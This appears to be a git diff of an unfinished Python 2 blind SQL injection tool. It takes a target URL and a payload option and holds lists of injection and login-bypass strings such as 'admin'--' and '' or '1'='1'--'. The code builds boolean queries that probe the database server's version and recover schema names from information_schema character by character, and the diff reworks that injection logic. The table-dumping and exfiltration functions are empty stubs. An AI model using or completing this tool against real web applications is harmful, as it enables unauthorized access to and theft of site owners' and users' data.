@@ -10,10 +10,14 @@ from optparse import OptionParser
 
 # --------- Global variables ----------
 #global l_database_name = []
-l_injnum = ["'", "1+1", "3-1", "1 or 1 = 1", "1) or (1 = 1", "1 and 1 = 2", "1) and (1 = 2", "1 or 'ab' = 'a' + 'b'", "1 or 'ab' = 'a''b", "1 or 'ab'='a'||'b'", "' and 'x' = 'p'#"]
-l_bypass = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--", "-1 and 1=2", "' and '1'='2'--", "1/* comment */"]
-l_bypass2 = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2", "') and '1'='2'--"]
-alphabet = "abcdefghijklmnopqrstuvwxyz"
+l_injnum        = ["'", "1+1", "3-1", "1 or 1 = 1", "1) or (1 = 1", "1 and 1 = 2", "1) and (1 = 2",
+                    "1 or 'ab' = 'a' + 'b'", "1 or 'ab' = 'a''b", "1 or 'ab'='a'||'b'", "' and 'x' = 'p'#"]
+l_bypass        = ["admin'--", "admin'#", "1--", "1 or 1 = 1--", "' or '1'='1'--", "-1 and 1=2",
+                    "' and '1'='2'--", "1/* comment */"]
+l_bypass2       = ["admin')--", "admin')#", "1)--", "1) or 1 = 1--", "') or '1'='1'--", "-1) and 1=2",
+                    "') and '1'='2'--"]
+alphabet        = "abcdefghijklmnopqrstuvwxyz"
+dump            = {}
 
 # --------- Main function option parsing ----------
 def main():
@@ -24,7 +28,7 @@ python sql.py TODO include args"""
     parser = OptionParser(usage=arg_help)
     try:
         parser.add_option("-u", "--url", action="store", type=str, dest="URL", help="The target url to inject")
-        parser.add_option("-d", "--detect-bypass", action="store", type=str, dest="BYPASS_DETECT", help="Detect the bypass to use during injection")
+        parser.add_option("-p", "--payload", action="store", type=str, dest="PAYLOAD", help="The payload used to trigger the injection")
         parser.add_option("-e", "--enum", action="store_true", dest="ENUM", help="Enumerate databases, tables columns")
         parser.add_option("-D", "--dump", action="store_true", dest="DUMP", help="Dump the chosen database")
         parser.add_option("-b", "--database", action="store", type=str, dest="DATABASE", help="The database to dump")
@@ -37,7 +41,7 @@ python sql.py TODO include args"""
     (options, args) = parser.parse_args()
 
     url                 = options.URL
-    bypass_detect       = options.BYPASS_DETECT
+    payload             = options.PAYLOAD
     enum                = options.ENUM
     dump                = options.DUMP
     database            = options.DATABASE
@@ -51,33 +55,22 @@ python sql.py TODO include args"""
         bypass = bypass_detect
     # Trouver la version du serveur SQL
     sql_version(url, bypass)
-    eunum_databases(url, bypass)
+    eunum_databases(url, payload, bypass)
     # Récupérer la base de données courantes et les autres bases de données
     # Pour chaque base database
         # Récupérer les tables
         # Pour chaque table
             # Récupérer le nombre de colonnes
 
-# --------- Find the proper bypass ----------
-def find_bypass(url):
-    for bypass in l_injnum,l_bypass,l_bypass2:
-# a faire
-        pass
-    pass
-
-# --------- Find the numer of columns ----------
-def enum_columns(url, bypass):
-    pass
-
 # --------- Find SQL database version ----------
-def sql_version(url, bypass):
+def sql_version(url, payload, bypass):
     '''
         Request working on leettime
         Is the base request for finding the database version number
         uri = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
     '''
     for sql_version in range(4,7):
-        uri = url + "' and "  + "substring(@@version,1,1)>=" + str(sql_version) + str(bypass)
+        uri = url + str(payload)  + "substring(@@version,1,1)>=" + str(sql_version) + str(bypass)
         server_response = request_handler(uri)
         server_response_status = validate_request(server_response)
 
@@ -90,8 +83,12 @@ def sql_version(url, bypass):
 
     return server_version
 
+# --------- Find the numer of columns ----------
+def enum_columns(url, payload, bypass, database, table):
+    pass
+
 # --------- Enumerate databases ----------
-def eunum_databases(url, bypass):
+def eunum_databases(url, payload, bypass):
     '''
         Request working on leettime
         Is the base request for finding the number of databases, how many characters are in each database name
@@ -101,11 +98,13 @@ def eunum_databases(url, bypass):
             Handle the case where database increment starts at 1 so first test will be false, second true, n true, o false...
         TODO
     '''
+
     database_increment = 0
 
     # Count how many databases, we assume there are less than 64 databases
     while (database_increment < 64):
-        uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
+        # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
+        uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
         server_response = request_handler(uri)
         server_response_status = validate_request(server_response)
 
@@ -119,7 +118,8 @@ def eunum_databases(url, bypass):
 
                 # Count how many chars in db name, we assume the database name to be less than 128 characters
                 while (database_letter_count < 128):
-                    uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>0" + bypass
+                    # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>0" + bypass
+                    uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>0" + bypass
                     server_response = request_handler(uri)
                     server_response_status = validate_request(server_response)
 
@@ -132,7 +132,8 @@ def eunum_databases(url, bypass):
 
                             # Loop in ascii range to guess each character
                             for database_letter in range(1,128):
-                                uri = url + "' and ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(database_letter_count) + ",1))>=" + str(database_letter) + bypass
+                                # uri = url + "' and ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(database_letter_count) + ",1))>=" + str(database_letter) + bypass
+                                uri = url + str(payload) + "ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(database_letter_count) + ",1))>=" + str(database_letter) + bypass
                                 server_response = request_handler(uri)
                                 server_response_status = validate_request(server_response)
 
@@ -149,11 +150,11 @@ def eunum_databases(url, bypass):
             database_increment = database_increment + 1
 
 # --------- Enumerate database tables ----------
-def enum_tables(url, bypass, database):
+def enum_tables(url, payload, bypass, database):
     pass
 
 # --------- Dump the database ----------
-def exfiltrate_data(url, bypass, database):
+def exfiltrate_data(url, payload, bypass, database):
     pass
 
 # --------- Forge & send HTTP requests ----------
@@ -175,6 +176,26 @@ def validate_request(page):
         return False
     if page == "":
         print "Error: request returned empty page!"
+
+def display_database_struct(dump):
+    for database, table_dictionnary in dump.iteritems():
+        print "Database: " + str(database)
+
+        for table, column_list in table_dictionnary.iteritems():
+            print "Table: " + str(table)
+
+            for column in column_list:
+                print column
+
+def display_database_dump(dump):
+    for database, table_dictionnary in dump.iteritems():
+        print "Database: " + str(database)
+
+        for table, column_list in table_dictionnary.iteritems():
+            print "Table: " + str(table)
+
+            for column in column_list:
+                print column
 
 if __name__ == "__main__":
     main()
